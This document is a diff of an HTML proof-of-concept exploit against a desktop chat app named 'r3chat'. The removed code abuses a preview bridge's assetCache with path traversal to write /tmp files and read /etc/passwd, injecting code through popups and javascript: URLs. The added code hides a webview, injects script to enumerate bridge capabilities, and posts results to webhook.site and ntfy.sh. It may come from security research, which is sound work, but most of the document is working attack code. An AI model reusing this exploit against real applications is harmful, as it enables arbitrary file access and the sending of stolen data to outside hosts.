@@ -1,129 +1,80 @@
 <!doctype html>
 <meta charset="utf-8">
+<title>r3chat nested webview probe</title>
 <script>
-const CALLBACK = "https://webhook.site/02245dfe-0533-4e44-8390-43f3051d3aad";
+const TOPIC = "r3chat-yym-31983-nestedhtml2";
+const LOG = "https://ntfy.sh/" + TOPIC;
 
-async function log(data) {
-  await fetch(CALLBACK + "?" + new URLSearchParams(data), { mode: "no-cors" });
+function send(data) {
+  try {
+    fetch(LOG, {
+      method: "POST",
+      mode: "no-cors",
+      body: JSON.stringify(Object.assign({ t: Date.now() }, data))
+    });
+  } catch (_) {}
 }
 
+window.addEventListener("error", (e) => {
+  send({ stage: "top-error", err: String(e.error || e.message || e) });
+});
+
 (async () => {
-  const b = window.rcPartner || window.previewBridge;
-  if (!b) {
-    if (!new URLSearchParams(location.search).has("stage2")) {
-      const nonce = String(Date.now());
-      const next = location.origin + location.pathname + "?stage2=1&nonce=" + nonce;
-      const popup = window.open("https://www.google.com/?r3chat=" + nonce, "r3debug");
-      await log({ stage: "dbg-open", popup: String(!!popup), next });
+  send({
+    stage: "top-start",
+    href: location.href,
+    hasCustomWebview: !!customElements.get("webview")
+  });
 
-      try {
-        const payload = `
-          <script>
-          const CALLBACK = ${JSON.stringify(CALLBACK)};
-          async function log(data) {
-            await fetch(CALLBACK + "?" + new URLSearchParams(data), { mode: "no-cors" });
-          }
-          (async () => {
-            const b = window.rcPartner || window.previewBridge;
-            await log({ stage: "blank-injected", href: location.href, hasBridge: String(!!b) });
-            if (b) {
-              await log({ stage: "blank-caps", caps: JSON.stringify(await b.capabilities()) });
-              try {
-                await b.assetCache.put("../../../../../../tmp/r3chat-blank", "blank write\\n", "utf8");
-                await log({ stage: "blank-write-ok" });
-              } catch (e) {
-                await log({ stage: "blank-write-fail", err: String(e) });
-              }
+  const w = document.createElement("webview");
+  w.src = "https://www.google.com/?r3nested=" + Date.now();
+  w.partition = "persist:r3chat-nested";
+  w.setAttribute("allowpopups", "true");
+  w.style.cssText = "width:1024px;height:640px;position:absolute;left:0;top:0;opacity:0.01";
+  document.body.appendChild(w);
+  send({ stage: "appended", tag: w.tagName, src: w.src, execType: typeof w.executeJavaScript });
+
+  const run = async (why) => {
+    send({ stage: "try-exec", why, execType: typeof w.executeJavaScript, guest: w.getURL && w.getURL() });
+    try {
+      const code = `
+        (async () => {
+          const LOG = ${JSON.stringify(LOG)};
+          const out = (data) => fetch(LOG, {
+            method: "POST",
+            mode: "no-cors",
+            body: JSON.stringify(Object.assign({ t: Date.now() }, data))
+          }).catch(() => {});
+          const b = window.rcPartner || window.previewBridge;
+          await out({
+            stage: "inner",
+            href: location.href,
+            has: !!b,
+            keys: b ? Object.keys(b) : [],
+            assetKeys: b && b.assetCache ? Object.keys(b.assetCache) : []
+          });
+          if (b) {
+            try {
+              const caps = await b.capabilities();
+              await out({ stage: "caps", caps: JSON.stringify(caps).slice(0, 500) });
+            } catch (e) {
+              await out({ stage: "caps-fail", err: String(e) });
             }
-          })().catch(e => log({ stage: "blank-error", err: String(e && (e.stack || e)) }));
-          <\/script>`;
-        popup.document.open();
-        popup.document.write(payload);
-        popup.document.close();
-        await log({ stage: "dbg-blank-write-issued" });
-      } catch (e) {
-        await log({ stage: "dbg-blank-write-fail", err: String(e) });
-      }
-
-      setTimeout(async () => {
-        try {
-          popup.location.href = next + "&method=href";
-          await log({ stage: "dbg-set-href" });
-        } catch (e) {
-          await log({ stage: "dbg-set-href-fail", err: String(e) });
-        }
-      }, 800);
-
-      setTimeout(async () => {
-        try {
-          const js = `
-            (async function(){
-              const C=${JSON.stringify(CALLBACK)};
-              async function L(d){ await fetch(C+"?"+new URLSearchParams(d), {mode:"no-cors"}); }
-              try {
-                const b = window.rcPartner || window.previewBridge;
-                await L({stage:"jsurl-start", href:location.href, hasBridge:String(!!b)});
-                if (!b) return;
-                await L({stage:"jsurl-caps", caps:JSON.stringify(await b.capabilities())});
-                try {
-                  await b.assetCache.put("../../../../../../tmp/r3chat-jsurl", "jsurl write\\n", "utf8");
-                  await L({stage:"jsurl-write-ok"});
-                } catch(e) {
-                  await L({stage:"jsurl-write-fail", err:String(e)});
-                }
-                try {
-                  const p = await b.assetCache.get("../../../../../../etc/passwd", "utf8");
-                  await L({stage:"jsurl-read", sample:p.slice(0,180)});
-                } catch(e) {
-                  await L({stage:"jsurl-read-fail", err:String(e)});
-                }
-              } catch(e) {
-                await L({stage:"jsurl-error", err:String(e && (e.stack || e))});
-              }
-            })()
-          `;
-          popup.location.href = "javascript:" + js.replace(/\s+/g, " ");
-          await log({ stage: "dbg-jsurl-issued" });
-        } catch (e) {
-          await log({ stage: "dbg-jsurl-fail", err: String(e) });
-        }
-      }, 1500);
-
-      setTimeout(async () => {
-        try {
-          popup.location.replace(next + "&method=replace");
-          await log({ stage: "dbg-replace" });
-        } catch (e) {
-          await log({ stage: "dbg-replace-fail", err: String(e) });
-        }
-      }, 1800);
-
-      setTimeout(async () => {
-        try {
-          const p2 = window.open(next + "&method=open-existing", "r3debug");
-          await log({ stage: "dbg-open-existing", popup: String(!!p2) });
-        } catch (e) {
-          await log({ stage: "dbg-open-existing-fail", err: String(e) });
-        }
-      }, 2800);
-      return;
+          }
+        })();
+      `;
+      const r = await w.executeJavaScript(code, true);
+      send({ stage: "exec-ret", why, ret: String(r).slice(0, 200) });
+    } catch (e) {
+      send({ stage: "exec-fail", why, err: String(e) });
     }
-    await log({ stage: "stage2-no-bridge", href: location.href });
-    return;
-  }
+  };
 
-  await log({ stage: "bridge", caps: JSON.stringify(await b.capabilities()) });
-
-  const key = "../../../../../../tmp/r3chat-poc";
-  await b.assetCache.put(key, "r3chat arbitrary file write\n", "utf8");
-  await log({ stage: "wrote", key });
-
-  try {
-    const passwd = await b.assetCache.get("../../../../../../etc/passwd", "utf8");
-    await log({ stage: "read", sample: passwd.slice(0, 180) });
-  } catch (e) {
-    await log({ stage: "read-fail", err: String(e) });
-  }
-})().catch(e => log({ stage: "error", err: String(e && (e.stack || e)) }));
+  w.addEventListener("dom-ready", () => run("dom-ready"));
+  w.addEventListener("did-finish-load", () => run("finish"));
+  w.addEventListener("did-fail-load", (e) => send({ stage: "fail-load", code: e.errorCode, desc: e.errorDescription, url: e.validatedURL }));
+  setTimeout(() => run("timeout-1500"), 1500);
+  setTimeout(() => send({ stage: "top-timeout", guest: w.getURL && w.getURL() }), 6000);
+})();
 </script>
-<!-- rebuild 0239 jsurl -->
+<body>r3chat nested webview probe</body>
